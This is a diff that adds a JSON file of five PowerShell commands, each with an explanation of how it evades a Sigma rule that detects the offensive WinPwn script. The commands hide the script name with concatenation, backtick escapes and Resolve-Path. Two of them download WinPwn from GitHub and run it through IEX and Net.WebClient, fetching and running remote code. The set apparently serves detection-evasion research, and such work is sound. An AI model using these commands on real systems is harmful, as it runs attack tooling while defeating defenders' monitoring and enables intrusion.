@@ -1,0 +1,22 @@
+[
+  {
+    "output": "powershell.exe -c \"& (\"Win\" + \"Pwn.ps1\") -noninteractive\"",
+    "explanation": "This command uses string concatenation to bypass the direct detection of 'WinPwn.ps1' in the command line. The script name is split into two parts and joined at runtime, which avoids the Sigma rule's string-based detection."
+  },
+  {
+    "output": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); & (\"Win\" + \"Pwn\") -noninteractive\"",
+    "explanation": "This command downloads the WinPwn script and executes it using string concatenation to evade the detection of 'WinPwn' in the command line. The script name is split into two parts to avoid direct string matching."
+  },
+  {
+    "output": "powershell.exe -ExecutionPolicy Bypass -Command \"& (\"W`inP`wn.ps1\" -replace '`', '') -noninteractive\"",
+    "explanation": "This command uses escape characters and string replacement to obfuscate the script name 'WinPwn.ps1'. The backticks are used to split the string, and the replacement removes them at runtime, evading the Sigma rule's detection."
+  },
+  {
+    "output": "powershell.exe -c \"& (Resolve-Path (\".\\Win\" + \"Pwn.ps1\")) -noninteractive\"",
+    "explanation": "This command uses string concatenation and the Resolve-Path cmdlet to dynamically construct the script path. This avoids direct detection of 'WinPwn.ps1' in the command line."
+  },
+  {
+    "output": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); & (\"W`inP`wn\" -replace '`', '') -noninteractive\"",
+    "explanation": "This command downloads the WinPwn script and uses escape characters and string replacement to obfuscate the script name. The backticks are used to split the string, and the replacement removes them at runtime, evading the Sigma rule's detection."
+  }
+]
